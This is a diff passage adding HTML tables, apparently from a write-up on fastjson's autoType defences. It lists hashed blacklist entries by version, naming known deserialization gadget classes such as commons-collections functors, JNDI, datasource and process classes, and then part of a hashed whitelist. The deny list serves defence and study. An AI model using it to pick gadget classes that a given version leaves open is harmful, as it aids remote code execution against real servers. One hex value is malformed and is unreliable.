+<td>org.apache.commons.collections.functors</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>8838294710098435315</td>
+<td>0x7aa7ee3627a19cf3L</td>
+<td>org.apache.myfaces.context.servlet</td>
+</tr>
+<tr>
+<td>1.2.43</td>
+<td>-2262244760619952081</td>
+<td>0xe09ae4604842582fL</td>
+<td>java.net.URL</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-8165637398350707645</td>
+<td>0x8eadd40cb2a94443L</td>
+<td>junit.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-8083514888460375884</td>
+<td>0x8fd1960988bce8b4L</td>
+<td>org.apache.ibatis.datasource</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-7921218830998286408</td>
+<td>0x92122d710e364fb8L</td>
+<td>org.osjava.sj.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-7768608037458185275</td>
+<td>0x94305c26580f73c5L</td>
+<td>org.apache.log4j.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-6179589609550493385</td>
+<td>0xaa3daffdb10c4937L</td>
+<td>org.logicalcobwebs.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-5194641081268104286</td>
+<td>0xb7e8ed757f5d13a2L</td>
+<td>org.apache.logging.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-3935185854875733362</td>
+<td>0xc963695082fd728eL</td>
+<td>org.apache.commons.dbcp</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-2753427844400776271</td>
+<td>0xd9c9dbf6bbd27bb1L</td>
+<td>com.ibatis.sqlmap.engine.datasource</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-1589194880214235129</td>
+<td>0xe9f20bad25f60807L</td>
+<td>org.jdom.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>1073634739308289776</td>
+<td>0xee6511b66fd5ef0L</td>
+<td>org.slf4j.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>5688200883751798389</td>
+<td>0x4ef08c90ff16c675L</td>
+<td>javassist.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>7017492163108594270</td>
+<td>0x616323f12c2ce25eL</td>
+<td>oracle.net</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>8389032537095247355</td>
+<td>0x746bd4a53ec195fbL</td>
+<td>org.jaxen.</td>
+</tr>
+<tr>
+<td>1.2.48</td>
+<td>1459860845934817624</td>
+<td>0x144277b467723158L</td>
+<td>java.net.InetAddress</td>
+</tr>
+<tr>
+<td>1.2.48</td>
+<td>8409640769019589119</td>
+<td>0x74b50bb9260e31ffL</td>
+<td>java.lang.Class</td>
+</tr>
+<tr>
+<td>1.2.49</td>
+<td>4904007817188630457</td>
+<td>0x440e89208f445fb9L</td>
+<td>com.alibaba.fastjson.annotation</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>5100336081510080343</td>
+<td>0x46c808a4b5841f57L</td>
+<td>org.apache.cxf.jaxrs.provider.</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>6456855723474196908</td>
+<td>0x599b5c1213a099acL</td>
+<td>ch.qos.logback.</td>
+</tr>
+<tr>
+<td>1.2.59</td>
+<td>8537233257283452655</td>
+<td>0x767a586a5107feefL</td>
+<td>net.sf.ehcache.transaction.manager.</td>
+</tr>
+<tr>
+<td>1.2.60</td>
+<td>3688179072722109200</td>
+<td>0x332f0b5369a18310L</td>
+<td>com.zaxxer.hikari.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-4401390804044377335</td>
+<td>0xc2eb1e621f439309L</td>
+<td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-1650485814983027158</td>
+<td>0xe9184be55b1d962aL</td>
+<td>org.apache.openjpa.ee.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-1251419154176620831</td>
+<td>0xeea210e8da2ec6e1L</td>
+<td>oracle.jdbc.rowset.OracleJDBCRowSet</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>-9822483067882491</td>
+<td>0xffdd1a80f1ed3405L</td>
+<td>com.mysql.cj.jdbc.admin.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>99147092142056280</td>
+<td>0x1603dc147a3e358L</td>
+<td>oracle.jdbc.connector.OracleManagedConnectionFactory</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>3114862868117605599</td>
+<td>0x2b3a37467a344cdfL</td>
+<td>org.apache.ibatis.parsing.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>4814658433570175913</td>
+<td>0x42d11a560fc9fba9L</td>
+<td>org.apache.axis2.jaxws.spi.handler.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>6511035576063254270</td>
+<td>0x5a5bd85c072e5efeL</td>
+<td>jodd.db.connection.</td>
+</tr>
+<tr>
+<td>1.2.61</td>
+<td>8925522461579647174</td>
+<td>0x7bddd363ad3998c6L</td>
+<td>org.apache.commons.configuration.JNDIConfiguration</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-9164606388214699518</td>
+<td>0x80d0c70bcc2fea02L</td>
+<td>org.apache.ibatis.executor.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-8649961213709896794</td>
+<td>0x87f52a1b07ea33a6L</td>
+<td>net.sf.cglib.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-6316154655839304624</td>
+<td>0xa85882ce1044c450L</td>
+<td>oracle.net.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-5764804792063216819</td>
+<td>0xafff4c95b99a334dL</td>
+<td>com.mysql.cj.jdbc.MysqlDataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-4608341446948126581</td>
+<td>0xc00be1debaf2808bL</td>
+<td>jdk.internal.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-4438775680185074100</td>
+<td>0xc2664d0958ecfe4cL</td>
+<td>aj.org.objectweb.asm.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-3319207949486691020</td>
+<td>0xd1efcdf4b3316d34L</td>
+<td>oracle.jdbc.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-2192804397019347313</td>
+<td>0xe1919804d5bf468fL</td>
+<td>org.apache.commons.collections.comparators.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-2095516571388852610</td>
+<td>0xe2eb3ac7e56c467eL</td>
+<td>net.sf.ehcache.hibernate.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4750336058574309</td>
+<td>0x10e067cd55c5e5L</td>
+<td>com.mysql.cj.log.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>218512992947536312</td>
+<td>0x3085068cb7201b8L</td>
+<td>org.h2.jdbcx.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>823641066473609950</td>
+<td>0xb6e292fa5955adeL</td>
+<td>org.apache.commons.logging.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>1534439610567445754</td>
+<td>0x154b6cb22d294cfaL</td>
+<td>org.apache.ibatis.reflection.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>1818089308493370394</td>
+<td>0x193b2697eaaed41aL</td>
+<td>org.h2.server.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2164696723069287854</td>
+<td>0x1e0a8c3358ff3daeL</td>
+<td>org.apache.ibatis.datasource.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2653453629929770569</td>
+<td>0x24d2f6048fef4e49L</td>
+<td>org.objectweb.asm.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>2836431254737891113</td>
+<td>0x275d0732b877af29L</td>
+<td>flex.messaging.util.concurrent.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3089451460101527857</td>
+<td>0x2adfefbbfe29d931L</td>
+<td>org.apache.ibatis.javassist.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3256258368248066264</td>
+<td>0x2d308dbbc851b0d8L</td>
+<td>java.lang.UNIXProcess</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3718352661124136681</td>
+<td>0x339a3e0b6beebee9L</td>
+<td>org.apache.ibatis.ognl.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4046190361520671643</td>
+<td>0x3826f4b2380c8b9bL</td>
+<td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4841947709850912914</td>
+<td>0x43320dc9d2ae0892L</td>
+<td>org.codehaus.jackson.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6280357960959217660</td>
+<td>0x5728504a6d454ffcL</td>
+<td>org.apache.ibatis.scripting.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6534946468240507089</td>
+<td>0x5ab0cb3071ab40d1L</td>
+<td>org.apache.commons.proxy.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6734240326434096246</td>
+<td>0x5d74d3e5b9370476L</td>
+<td>com.mysql.cj.jdbc.MysqlXADataSource</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>7123326897294507060</td>
+<td>0x62db241274397c34L</td>
+<td>org.apache.commons.collections.functors.</td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>8488266005336625107</td>
+<td>0x75cc60f5871d0fd3L</td>
+<td>org.apache.commons.configuration</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>-2439930098895578154</td>
+<td>0xde23a0809a8b9bd6L</td>
+<td>javax.script.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>-582813228520337988</td>
+<td>0xf7e96e74dfa58dbcL</td>
+<td>javax.sound.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>-26639035867733124</td>
+<td>0xffa15bf021f1e37cL</td>
+<td>javax.print.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>386461436234701831</td>
+<td>0x55cfca0f2281c07L</td>
+<td>javax.activation.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>1153291637701043748</td>
+<td>0x100150a253996624L</td>
+<td>javax.tools.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>1698504441317515818L</td>
+<td>0x17924cca5227622aL</td>
+<td>javax.management.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>7375862386996623731L</td>
+<td>0x665c53c311193973L</td>
+<td>org.apache.xbean.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>7658177784286215602L</td>
+<td>0x6a47501ebb2afdb2L</td>
+<td>org.eclipse.jetty.</td>
+</tr>
+<tr>
+<td>1.2.66</td>
+<td>8055461369741094911L</td>
+<td>0x6fcabf6fa54cafffL</td>
+<td>javax.naming.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-7775351613326101303L</td>
+<td>0x941866e73beff4c9L</td>
+<td>org.apache.shiro.realm.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-6025144546313590215L</td>
+<td>0xac6262f52c98aa39L</td>
+<td>org.apache.http.conn.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-5939269048541779808L</td>
+<td>0xad937a449831e8a0L</td>
+<td>org.quartz.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-5885964883385605994L</td>
+<td>0xae50da1fad60a096L</td>
+<td>com.taobao.eagleeye.wrapper</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-3975378478825053783L</td>
+<td>0xc8d49e5601e661a9L</td>
+<td>org.apache.http.impl.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-2378990704010641148L</td>
+<td>0xdefc208f237d4104L</td>
+<td>com.ibatis.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>-905177026366752536L</td>
+<td>0xf3702a4a5490b8e8L</td>
+<td>org.apache.catalina.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>2660670623866180977L</td>
+<td>0x24ec99d5e7dc5571L</td>
+<td>org.apache.http.auth.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>2731823439467737506L</td>
+<td>0x25e962f1c28f71a2L</td>
+<td>br.com.anteros.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>3637939656440441093L</td>
+<td>0x327c8ed7c8706905L</td>
+<td>com.caucho.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>4254584350247334433L</td>
+<td>0x3b0b51ecbf6db221L</td>
+<td>org.apache.http.cookie.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>5274044858141538265L</td>
+<td>0x49312bdafb0077d9L</td>
+<td>org.javasimon.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>5474268165959054640L</td>
+<td>0x4bf881e49d37f530L</td>
+<td>org.apache.cocoon.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>5596129856135573697L</td>
+<td>0x4da972745feb30c1L</td>
+<td>org.apache.activemq.jms.pool.</td>
+</tr>
+<tr>
+<td>1.2.67</td>
+<td>6854854816081053523L</td>
+<td>0x5f215622fb630753L</td>
+<td>org.mortbay.jetty.</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>-3077205613010077203L</td>
+<td>0xd54b91cc77b239edL</td>
+<td>org.apache.shiro.jndi.</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>-2825378362173150292L</td>
+<td>0xd8ca3d595e982bacL</td>
+<td>org.apache.ignite.cache.jta.</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>2078113382421334967L</td>
+<td>0x1cd6f11c6a358bb7L</td>
+<td>javax.swing.J</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>6007332606592876737L</td>
+<td>0x535e552d6f9700c1L</td>
+<td>org.aoju.bus.proxy.provider.</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>9140390920032557669L</td>
+<td>0x7ed9311d28bf1a65L</td>
+<td>java.awt.p</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>9140416208800006522L</td>
+<td>0x7ed9481d28bf417aL</td>
+<td>java.awt.i</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-8024746738719829346L</td>
+<td>0x90a25f5baa21529eL</td>
+<td>java.io.Serializable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-5811778396720452501L</td>
+<td>0xaf586a571e302c6bL</td>
+<td>java.io.Closeable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-3053747177772160511L</td>
+<td>0xd59ee91f0b09ea01L</td>
+<td>oracle.jms.AQ</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-2114196234051346931L</td>
+<td>0xe2a8ddba03e69e0dL</td>
+<td>java.util.Collection</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-2027296626235911549L</td>
+<td>0xe3dd9875a2dc5283L</td>
+<td>java.lang.Iterable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-2939497380989775398L</td>
+<td>0xd734ceb4c3e9d1daL</td>
+<td>java.lang.Object</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-1368967840069965882L</td>
+<td>0xed007300a7b227c6L</td>
+<td>java.lang.AutoCloseable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>2980334044947851925L</td>
+<td>0x295c4605fd1eaa95L</td>
+<td>java.lang.Readable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>3247277300971823414L</td>
+<td>0x2d10a5801b9d6136L</td>
+<td>java.lang.Cloneable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>5183404141909004468L</td>
+<td>0x47ef269aadc650b4L</td>
+<td>java.lang.Runnable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>7222019943667248779L</td>
+<td>0x6439c4dff712ae8bL</td>
+<td>java.util.EventListener</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>-5076846148177416215L</td>
+<td>0xb98b6b5396932fe9L</td>
+<td>org.apache.commons.collections4.Transformer</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>-4703320437989596122L</td>
+<td>0xbeba72fb1ccba426L</td>
+<td>org.apache.commons.collections4.functors</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>-4314457471973557243L</td>
+<td>0xc41ff7c9c87c7c05L</td>
+<td>org.jdom2.transform.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>-2533039401923731906L</td>
+<td>0xdcd8d615a6449e3eL</td>
+<td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>156405680656087946L</td>
+<td>0x22baa234c5bfb8aL</td>
+<td>com.p6spy.engine.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>1214780596910349029L</td>
+<td>0x10dbc48446e0dae5L</td>
+<td>org.apache.activemq.pool.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>3085473968517218653L</td>
+<td>0x2ad1ce3a112f015dL</td>
+<td>org.apache.aries.transaction.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>3129395579983849527L</td>
+<td>0x2b6dd8b3229d6837L</td>
+<td>org.apache.activemq.ActiveMQConnectionFactory</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>4241163808635564644L</td>
+<td>0x3adba40367f73264L</td>
+<td>org.apache.activemq.spring.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>7240293012336844478L</td>
+<td>0x647ab0224e149ebeL</td>
+<td>org.apache.activemq.ActiveMQXAConnectionFactory</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>7347653049056829645L</td>
+<td>0x65f81b84c1d920cdL</td>
+<td>org.apache.commons.jelly.</td>
+</tr>
+<tr>
+<td>1.2.70</td>
+<td>7617522210483516279L</td>
+<td>0x69b6e0175084b377L</td>
+<td>org.apache.axis2.transport.jms.</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-4537258998789938600L</td>
+<td>0xc1086afae32e6258L</td>
+<td>java.io.FileReader</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-4150995715611818742L</td>
+<td>0xc664b363baca050aL</td>
+<td>java.io.ObjectInputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-2995060141064716555L</td>
+<td>0xd66f68ab92e7fef5L</td>
+<td>java.io.FileInputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-965955008570215305L</td>
+<td>0xf2983d099d29b477L</td>
+<td>java.io.ObjectOutputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>-219577392946377768L</td>
+<td>0xfcf3e78644b98bd8L</td>
+<td>java.io.DataOutputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>2622551729063269307L</td>
+<td>x24652ce717e713bbL</td>
+<td>java.io.PrintWriter</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>2930861374593775110L</td>
+<td>0x28ac82e44e933606L</td>
+<td>java.io.Buffered</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>4000049462512838776L</td>
+<td>0x378307cb0111e878L</td>
+<td>java.io.InputStreamReader</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>4193204392725694463L</td>
+<td>0x3a31412dbb05c7ffL</td>
+<td>java.io.OutputStreamWriter</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>5545425291794704408L</td>
+<td>0x4cf54eec05e3e818L</td>
+<td>java.io.FileWriter</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>6584624952928234050L</td>
+<td>0x5b6149820275ea42L</td>
+<td>java.io.FileOutputStream</td>
+</tr>
+<tr>
+<td>1.2.71</td>
+<td>7045245923763966215L</td>
+<td>0x61c5bdd721385107L</td>
+<td>java.io.DataInputStream</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-8754006975464705441L</td>
+<td>0x868385095a22725fL</td>
+<td>org.apache.commons.io.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-8382625455832334425L</td>
+<td>0x8baaee8f9bf77fa7L</td>
+<td>org.mvel2.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-6088208984980396913L</td>
+<td>0xab82562f53e6e48fL</td>
+<td>kotlin.reflect.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-4733542790109620528L</td>
+<td>0xbe4f13e96a6796d0L</td>
+<td>com.googlecode.aviator.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-1363634950764737555L</td>
+<td>0xed13653cb45c4bedL</td>
+<td>org.aspectj.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>-803541446955902575L</td>
+<td>0xf4d93f4fb3e3d991L</td>
+<td>org.dom4j.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>860052378298585747L</td>
+<td>0xbef8514d0b79293L</td>
+<td>org.apache.commons.cli.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>1268707909007641340L</td>
+<td>0x119b5b1f10210afcL</td>
+<td>com.google.common.eventbus.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>3058452313624178956L</td>
+<td>0x2a71ce2cc40a710cL</td>
+<td>org.thymeleaf.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>3740226159580918099L</td>
+<td>0x33e7f3e02571b153L</td>
+<td>org.junit.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>3977090344859527316L</td>
+<td>0x37317698dcfce894L</td>
+<td>org.mockito.asm.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>4319304524795015394L</td>
+<td>0x3bf14094a524f0e2L</td>
+<td>com.google.common.io.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>5120543992130540564L</td>
+<td>0x470fd3a18bb39414L</td>
+<td>org.mockito.runners.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>5916409771425455946L</td>
+<td>0x521b4f573376df4aL</td>
+<td>org.mockito.cglib.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>6090377589998869205L</td>
+<td>0x54855e265fe1dad5L</td>
+<td>com.google.common.reflect.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>7164889056054194741L</td>
+<td>0x636ecca2a131b235L</td>
+<td>org.mockito.stubbing.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>8711531061028787095L</td>
+<td>0x78e5935826671397L</td>
+<td>org.apache.commons.codec.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>8735538376409180149L</td>
+<td>0x793addded7a967f5L</td>
+<td>ognl.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>8861402923078831179L</td>
+<td>0x7afa070241b8cc4bL</td>
+<td>com.google.common.util.concurrent.</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>9140416208800006522L</td>
+<td>0x7ed9481d28bf417aL</td>
+<td>java.awt.i</td>
+</tr>
+<tr>
+<td>1.2.83</td>
+<td>9144212112462101475L</td>
+<td>0x7ee6c477da20bbe3L</td>
+<td>com.google.common.net.</td>
+</tr>
+</tbody></table>
+<p><code>fastjson</code>在1.2.67开始，将内置白名单也使用哈希的方式存放。</p>
+<p>白名单有这些：</p>
+<table>
+<thead>
+<tr>
+<th>hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0xD4788669A13AE74L</td>
+<td>java.awt.Rectangle</td>
+</tr>
+<tr>
+<td>0xE08EE874A26F5EAFL</td>
+<td>java.awt.Point</td>
+</tr>
+<tr>
+<td>0xDDAAA11FECA77B5EL</td>
+<td>java.awt.Font</td>
+</tr>
+<tr>
+<td>0xB81BA299273D4E6L</td>
+<td>java.awt.Color</td>
+</tr>
+<tr>
+<td>0xA8AAA929446FFCE4L</td>
+<td>com.alibaba.fastjson.util.AntiCollisionHashMap</td>
+</tr>
+<tr>
+<td>0xD0E71A6E155603C1L</td>
+<td>com.alipay.sofa.rpc.core.exception.SofaTimeOutException</td>
+</tr>
+<tr>
+<td>0x9F2E20FB6049A371L</td>
+<td>java.util.Collections.UnmodifiableMap</td>
+</tr>
+<tr>
+<td>0xD45D6F8C9017FAL</td>
+<td>java.util.concurrent.ConcurrentSkipListMap</td>
+</tr>
+<tr>
+<td>0x64DC636F343516DCL</td>
+<td>java.util.concurrent.ConcurrentSkipListSet</td>
+</tr>
+<tr>
+<td>0x7FE2B8E675DA0CEFL</td>
+<td>org.springframework.dao.CannotAcquireLockException</td>
+</tr>
+<tr>
+<td>0xF8C7EF9B13231FB6L</td>
+<td>org.springframework.dao.CannotSerializeTransactionException</td>
+</tr>
+<tr>
+<td>0x42646E60EC7E5189L</td>
+<td>org.springframework.dao.CleanupFailureDataAccessException</td>
+</tr>
+<tr>
+<td>0xCC720543DC5E7090L</td>
+<td>org.springframework.dao.ConcurrencyFailureException</td>
+</tr>
+<tr>
+<td>0xC0FE32B8DC897DE9L</td>
+<td>org.springframework.dao.DataAccessResourceFailureException</td>
+</tr>
+<tr>
+<td>0xDC9583F0087CC2C7L</td>
+<td>org.springframework.dao.DataIntegrityViolationException</td>
+</tr>
+<tr>
+<td>0x5449EC9B0280B9EFL</td>
+<td>org.springframework.dao.DataRetrievalFailureException</td>
+</tr>
+<tr>
+<td>0xEB7D4786C473368DL</td>
+<td>org.springframework.dao.DeadlockLoserDataAccessException</td>
+</tr>
+<tr>
+<td>0x44D57A1B1EF53451L</td>
+<td>org.springframework.dao.DuplicateKeyException</td>
+</tr>
+<tr>
+<td>0xC92D8F9129AF339BL</td>
+<td>org.springframework.dao.EmptyResultDataAccessException</td>
+</tr>
+<tr>
+<td>0x9DF9341F0C76702L</td>
+<td>org.springframework.dao.IncorrectResultSizeDataAccessException</td>
+</tr>
+<tr>
+<td>0xDB7BFFC197369352L</td>
+<td>org.springframework.dao.IncorrectUpdateSemanticsDataAccessException</td>
+</tr>
+<tr>
+<td>0x73FBA1E41C4C3553L</td>
+<td>org.springframework.dao.InvalidDataAccessApiUsageException</td>
+</tr>
+<tr>
+<td>0x76566C052E83815L</td>
+<td>org.springframework.dao.InvalidDataAccessResourceUsageException</td>
+</tr>
+<tr>
+<td>0x61D10AF54471E5DEL</td>
+<td>org.springframework.dao.NonTransientDataAccessException</td>
+</tr>
+<tr>
+<td>0x82E8E13016B73F9EL</td>
+<td>org.springframework.dao.NonTransientDataAccessResourceException</td>
+</tr>
+<tr>
+<td>0xE794F5F7DCD3AC85L</td>
+<td>org.springframework.dao.OptimisticLockingFailureException</td>
+</tr>
+<tr>
+<td>0x3F64BC3933A6A2DFL</td>
+<td>org.springframework.dao.PermissionDeniedDataAccessException</td>
+</tr>
+<tr>
+<td>0x863D2DD1E82B9ED9L</td>
+<td>org.springframework.dao.PessimisticLockingFailureException</td>
+</tr>
+<tr>
+<td>0x4BB3C59964A2FC50L</td>
+<td>org.springframework.dao.QueryTimeoutException</td>
+</tr>
+<tr>
+<td>0x552D9FB02FFC9DEFL</td>
+<td>org.springframework.dao.RecoverableDataAccessException</td>
+</tr>
+<tr>
+<td>0x21082DFBF63FBCC1L</td>
+<td>org.springframework.dao.TransientDataAccessException</td>
+</tr>
+<tr>
+<td>0x178B0E2DC3AE9FE5L</td>
+<td>org.springframework.dao.TransientDataAccessResourceException</td>
+</tr>
+<tr>
+<td>0x24AE2D07FB5D7497L</td>
+<td>org.springframework.dao.TypeMismatchDataAccessException</td>
+</tr>
+<tr>
+<td>0x90003416F28ACD89L</td>
+<td>org.springframework.dao.UncategorizedDataAccessException</td>
+</tr>
+<tr>
+<td>0x73A0BE903F2BCBF4L</td>
+<td>org.springframework.jdbc.BadSqlGrammarException</td>
+</tr>
+<tr>
+<td>0x7B606F16A261E1E6L</td>
+<td>org.springframework.jdbc.CannotGetJdbcConnectionException</td>
+</tr>
+<tr>
+<td>0xAFCB539973CEA3F7L</td>
+<td>org.springframework.jdbc.IncorrectResultSetColumnCountException</td>
+</tr>
+<tr>
+<td>0x4A39C6C7ACB6AA18L</td>
+<td>org.springframework.jdbc.InvalidResultSetAccessException</td>
+</tr>
+<tr>
+<td>0x9E404E583F254FD4L</td>
+<td>org.springframework.jdbc.JdbcUpdateAffectedIncorrectNumberOfRowsException</td>
+</tr>
+<tr>
+<td>0x34CC8E52316FA0CBL</td>
+<td>org.springframework.jdbc.LobRetrievalFailureException</td>
+</tr>
+<tr>
+<td>0xB5114C70135C4538L</td>
+<td>org.springframework.jdbc.SQLWarningException</td>
+</tr>
+<tr>
+<td>0x7F36112F218143B6L</td>
+<td>org.springframework.jdbc.UncategorizedSQLException</td>
+</tr>
+<tr>
+<td>0x26C5D923AF21E2E1L</td>
+<td>org.springframework.cache.support.NullValue</td>
+</tr>
+<tr>
+<td>0xD11D2A941337A7BCL</td>
+<td>org.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken</td>
+</tr>
+<tr>
+<td>0x4F0C3688E8A18F9FL</td>
+<td>org.springframework.security.oauth2.common.DefaultOAuth2AccessToken</td>
+</tr>
+<tr>
+<td>0xC59AA84D9A94C640L</td>
+<td>org.springframework.security.oauth2.common.DefaultOAuth2RefreshToken</td>
+</tr>
+<tr>
+<td>0x1F10A70EE4065963L</td>
+<td>org.springframework.util.LinkedMultiValueMap</td>
+</tr>
+<tr>
+<td>0x557F642131553498L</td>
+<td>org.springframework.util.LinkedCaseInsensitiveMap</td>
+</tr>
+<tr>
+<td>0x8B2081CB3A50BD44L</td>
+<td>org.springframework.remoting.support.RemoteInvocation</td>
+</tr>
